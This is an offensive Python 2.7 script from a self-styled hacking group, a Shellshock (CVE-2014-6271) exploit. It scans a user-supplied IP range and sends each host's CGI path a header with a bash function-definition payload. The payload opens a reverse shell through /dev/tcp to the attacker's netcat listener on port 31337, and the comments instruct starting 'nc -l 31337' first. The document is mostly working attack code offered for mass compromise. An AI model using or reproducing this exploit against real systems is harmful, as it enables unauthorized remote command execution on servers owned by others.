We are...
                      _____                         _________              
                     /  _  \   ____   ____   ____  /   _____/ ____   ____  
                    /  /_\  \ /    \ /  _ \ /    \ \_____  \_/ __ \_/ ___\
                   /    |    \   |  (  <_> )   |  \/        \  ___/\  \___
                   \____|__  /___|  /\____/|___|  /_______  /\___  >\___  >
                           \/     \/            \/        \/     \/     \/
                                    //Laughing at your security since 2012*
=================================================================================================
Official Members: Mrlele - AnonSec666 - 3r3b0s - 4prili666h05t - Hannaichi - ap3x h4x0r - d3f4ult
                         - Gh05tFr3ak - xCyb3r 3vil7 -  Hassouna Khalil - spider64
=================================================================================================

# \!/ Enter your No-Ip address or other listening address in line 57 \!/  
#       \!/  Launch   nc -l 31337   before executing script!  \!/
# Dont forgets to update bash so you donts get PWNed while "testing"... lol
# yum -y update bash; apt-get -y update bash; reboot
# (Script is coded in python2.7, errors running with python3.0) 

import httplib,urllib

print "###########################################################"
print "###                  ShellShock.py                      ###"       
print "###       Bash 0-day Environment Variable Injector      ###"
print "###                  CVE-2014-6271                      ###"
print "### *************************************************** ###"
print "###                                                     ###"
print "###          It's either shell or be shelled            ###"                      
print "###                                                     ###"
print "###                    _.-''|''-._                      ###"
print "###                 .-'     |     `-.                   ###"
print "###               .'\       |       /`.                 ###"
print "###             .'   \      |      /   `.               ###"
print "###             \     \     |     /     /               ###"
print "###              `\    \    |    /    /'                ###"
print "###                `\   \   |   /   /'                  ###"
print "###                  `\  \  |  /  /'                    ###"
print "###                 _.-`\ \ | / /'-._                   ###"
print "###                {_____`\\|//'______}                  ###"
print "###                        `-'                          ###"
print "###                                                     ###"
print "### twitter.com/_d3f4ult                                ###"
print "###########################################################"
print "\n"     
print '\t\!/ Reverse shell returned on port 31337 \!/\n'
print '\t  Enter The First Three IP ranges To Scan \n'     
url = raw_input("          [Example : 123.456.789] : ")
finput = input("Enter the Starting IP of Range to Scan  : ")
sinput = input("Enter the Ending IP of Range to Scan for : ")
print
     
path = raw_input("Enter Vuln CGI Path : ")
     
for x in range(finput,sinput + 1):
         murl = url + "." + str(x)
         conn = httplib.HTTPConnection(murl)
         reverse_shell='() { :; }; /bin/bash -i >& /dev/tcp/NO-IP/31337 0>&1'
         headers = {"Content-type": "application/x-www-form-urlencoded",
         "test": reverse_shell}
         conn.request("GET",path,headers=headers)
         res = conn.getresponse()
     
         if str(res.status) == '200':
                  print "[+] Website Present and Payload Successfully Sent To " + murl + path
                  data = res.read()
                  print data
         else:
                  print "[!]" + murl + path + " Is Not Vulnerable."